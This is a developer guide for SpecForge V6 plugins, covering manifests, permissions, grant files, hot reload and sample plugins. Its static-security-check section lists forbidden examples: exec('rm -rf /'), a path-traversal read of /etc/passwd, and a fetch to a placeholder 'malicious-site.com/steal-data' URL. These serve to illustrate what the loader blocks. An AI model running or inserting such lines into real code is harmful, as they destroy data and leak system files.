# Plugin Developer Guide

This guide explains how to develop plugins for SpecForge V6 using the plugin-loader subsystem.

## Overview

The SpecForge plugin system allows you to extend the functionality of SpecForge Daemon with custom plugins. Plugins are loaded at runtime with security checks to ensure they cannot access system resources without explicit permission.

### Key Features

- **Static Security Checks**: Plugins are analyzed before loading to detect prohibited API usage
- **Permission Declarations**: Plugins must declare required permissions explicitly
- **Authorization Management**: System administrators control which permissions are granted
- **Hot Reload**: Modify plugins without restarting the Daemon

## Creating a Plugin

### Step 1: Create Plugin Directory

Create a new directory for your plugin:

```
my-plugin/
├── plugin.json       # Required: manifest file
├── src/
│   └── index.ts      # Required: entry point
└── dist/             # Optional: compiled JavaScript
```

### Step 2: Write the Manifest

Create a `plugin.json` file in your plugin directory:

```json
{
  "schema_version": "1.0",
  "id": "my-awesome-plugin",
  "version": "1.0.0",
  "requires": ["filesystem.read"],
  "entry": "./dist/index.js",
  "description": "An awesome plugin for SpecForge",
  "author": "Your Name",
  "compatible": "^6.0.0"
}
```

### Step 3: Implement the Plugin

Create your plugin entry point:

```typescript
// src/index.ts
import { PluginInterface } from '@specforge/plugin-loader';

export interface MyPluginConfig {
  apiKey?: string;
}

export const myPlugin: PluginInterface = {
  // Plugin metadata
  id: 'my-awesome-plugin',
  version: '1.0.0',

  // Initialize the plugin
  async initialize(context: PluginContext): Promise<void> {
    console.log('Plugin initialized!');
    // Set up your plugin here
  },

  // Register tools or handlers
  async register(registry: PluginRegistry): Promise<void> {
    registry.registerTool({
      id: 'my-tool',
      name: 'My Awesome Tool',
      description: 'Does something awesome',
      execute: async (args) => {
        // Your tool implementation
        return { result: 'success' };
      }
    });
  },

  // Cleanup when plugin is unloaded
  async dispose(): Promise<void> {
    console.log('Plugin disposed');
    // Clean up resources
  }
};

export default myPlugin;
```

### Step 4: Build and Test

Build your plugin:

```bash
cd my-plugin
bun build src/index.ts --outdir dist --declaration
```

## Manifest File Format

The `plugin.json` file is the required manifest for every plugin.

### Required Fields

| Field | Type | Description |
|-------|------|-------------|
| `schema_version` | string | Format version (use "1.0") |
| `id` | string | Unique plugin identifier (kebab-case recommended) |
| `version` | string | Semantic version (e.g., "1.0.0") |
| `requires` | string[] | Array of required permissions |
| `entry` | string | Path to entry file (relative to plugin directory) |

### Optional Fields

| Field | Type | Description |
|-------|------|-------------|
| `description` | string | Human-readable plugin description |
| `author` | string | Plugin author name or organization |
| `compatible` | string | Compatible SpecForge version range (e.g., "^6.0.0") |
| `dependencies` | array | External dependencies required by the plugin |

### Permissions

Plugins must declare required permissions in the `requires` field. The following permissions are available:

| Permission | Description |
|------------|-------------|
| `filesystem.read` | Read files from the file system |
| `filesystem.write` | Write files to the file system |
| `network` | Make network requests |
| `child_process` | Spawn child processes |
| `env.read` | Read environment variables |

### Example Manifest

```json
{
  "schema_version": "1.0",
  "id": "github-integration",
  "version": "1.2.0",
  "requires": ["network", "filesystem.read"],
  "entry": "./dist/index.js",
  "description": "GitHub API integration for SpecForge",
  "author": "SpecForge Team",
  "compatible": "^6.0.0",
  "dependencies": [
    {
      "type": "library",
      "id": "octokit",
      "version": "^3.0.0"
    }
  ]
}
```

## Plugin Interface

Your plugin must implement the `PluginInterface`:

```typescript
interface PluginInterface {
  id: string;
  version: string;
  initialize(context: PluginContext): Promise<void>;
  register(registry: PluginRegistry): Promise<void>;
  dispose(): Promise<void>;
}

interface PluginContext {
  config: Record<string, any>;
  logger: Logger;
  eventBus: EventBus;
}

interface PluginRegistry {
  registerTool(tool: ToolDefinition): void;
  registerHandler(event: string, handler: EventHandler): void;
  registerWorkflow(workflow: WorkflowDefinition): void;
}
```

## Static Security Checks

The plugin loader performs static analysis on your plugin code before loading. The following patterns are prohibited:

### Prohibited Patterns

1. **Child Process Execution** (without `child_process` permission)
   ```typescript
   // Forbidden without declaring "child_process" permission
   import { exec } from 'child_process';
   exec('rm -rf /');
   ```

2. **Filesystem Escape** (path traversal attacks)
   ```typescript
   // Forbidden: escaping plugin directory
   import * as fs from 'fs';
   fs.readFile('../../../etc/passwd');
   ```

3. **Undeclared Network Access** (without `network` permission)
   ```typescript
   // Forbidden without declaring "network" permission
   import fetch from 'node-fetch';
   fetch('https://malicious-site.com/steal-data');
   ```

Ensure your plugin only uses APIs it declares in `requires`.

## Authorization Configuration

System administrators manage plugin permissions through configuration files.

### User-Level Grants

Located at `~/.specforge/config/plugin-grants.json`:

```json
{
  "schema_version": "1.0",
  "grants": ["filesystem.read", "env.read"]
}
```

### Project-Level Grants

Located at `<project>/.specforge/config/plugin-grants.json`:

```json
{
  "schema_version": "1.0",
  "grants": ["filesystem.read"],
  "plugins": {
    "my-plugin": ["filesystem.read", "filesystem.write"]
  }
}
```

### Grant Precedence

Project-level grants override user-level grants. If a plugin is listed in `plugins`, its grants are used instead of the global `grants` array.

## Hot Reload

Plugins support hot reload - you can modify and reload them without restarting the Daemon.

### How It Works

1. The plugin loader watches plugin directories for file changes
2. When a change is detected, the plugin is reloaded
3. The old plugin instance is disposed, and the new one is initialized
4. Other plugins remain unaffected

### Best Practices

- Keep your plugin stateless where possible
- Clean up all resources in the `dispose()` method
- Use proper error handling to prevent crashes during reload

## Example Plugins

### Minimal Plugin

A simple plugin that only logs on initialization:

```typescript
// src/index.ts
export default {
  id: 'minimal-example',
  version: '1.0.0',

  async initialize() {
    console.log('Minimal plugin initialized!');
  },

  async register() {
    // No tools or handlers to register
  },

  async dispose() {
    console.log('Minimal plugin disposed');
  }
};
```

```json
// plugin.json
{
  "schema_version": "1.0",
  "id": "minimal-example",
  "version": "1.0.0",
  "requires": [],
  "entry": "./dist/index.js",
  "description": "A minimal example plugin"
}
```

### Tool Plugin

A plugin that registers a custom tool:

```typescript
// src/index.ts
export default {
  id: 'tool-example',
  version: '1.0.0',

  async initialize() {},

  async register(registry) {
    registry.registerTool({
      id: 'hello-world',
      name: 'Hello World',
      description: 'Prints a greeting',
      execute: async (args) => {
        const name = args.name ?? 'World';
        return { message: `Hello, ${name}!` };
      }
    });
  },

  async dispose() {}
};
```

```json
// plugin.json
{
  "schema_version": "1.0",
  "id": "tool-example",
  "version": "1.0.0",
  "requires": [],
  "entry": "./dist/index.js",
  "description": "A plugin that registers a custom tool"
}
```

### File Reader Plugin

A plugin that reads files (requires `filesystem.read` permission):

```typescript
// src/index.ts
import * as fs from 'fs';
import * as path from 'path';

export default {
  id: 'file-reader',
  version: '1.0.0',

  async initialize() {},

  async register(registry) {
    registry.registerTool({
      id: 'read-file',
      name: 'Read File',
      description: 'Read content from a file',
      execute: async (args) => {
        const filePath = args.path;
        if (!filePath) {
          throw new Error('Path is required');
        }
        
        const content = await fs.promises.readFile(filePath, 'utf-8');
        return { content, path: filePath };
      }
    });
  },

  async dispose() {}
};
```

```json
// plugin.json
{
  "schema_version": "1.0",
  "id": "file-reader",
  "version": "1.0.0",
  "requires": ["filesystem.read"],
  "entry": "./dist/index.js",
  "description": "A plugin that reads files"
}
```

## Troubleshooting

### Plugin Load Fails

Check the error message:

- **MANIFEST_ERROR**: The `plugin.json` format is invalid
- **STATIC_CHECK_FAILED**: Your code uses prohibited APIs
- **AUTH_DENIED**: Your plugin requests permissions not granted by the administrator
- **DEPENDENCY_MISSING**: Required dependencies are not installed

### Static Check Failures

If you get `STATIC_CHECK_FAILED`:
1. Review the error details for the specific line numbers
2. Ensure you only use APIs matching your declared permissions
3. Avoid path traversal patterns like `../`

### Authorization Issues

If you get `AUTH_DENIED`:
1. Check your plugin's `requires` field matches your actual API usage
2. Contact your system administrator to grant the required permissions
3. Or create a `plugin-grants.json` in your project to grant permissions

## API Reference

### PluginInterface

```typescript
interface PluginInterface {
  /** Unique plugin identifier */
  id: string;
  
  /** Plugin version */
  version: string;

  /** Called when plugin is loaded */
  initialize(context: PluginContext): Promise<void>;

  /** Called to register tools, handlers, etc. */
  register(registry: PluginRegistry): Promise<void>;

  /** Called when plugin is unloaded */
  dispose(): Promise<void>;
}
```

### PluginContext

```typescript
interface PluginContext {
  /** Plugin configuration from manifest or config file */
  config: Record<string, any>;

  /** Logger for plugin output */
  logger: {
    info(message: string): void;
    warn(message: string): void;
    error(message: string, error?: Error): void;
  };

  /** Event bus for publishing events */
  eventBus: {
    emit(event: PluginEvent): void;
    on(event: string, handler: EventHandler): void;
  };
}
```

### PluginRegistry

```typescript
interface PluginRegistry {
  /** Register a tool that can be invoked by the system */
  registerTool(tool: ToolDefinition): void;

  /** Register an event handler */
  registerHandler(event: string, handler: EventHandler): void;

  /** Register a workflow */
  registerWorkflow(workflow: WorkflowDefinition): void;
}
```

## Next Steps

- Review the [Permission Configuration Guide](./permission-config.md)
- Check the [Troubleshooting Guide](./troubleshooting.md)
- Explore the [API Reference](./api-reference.md)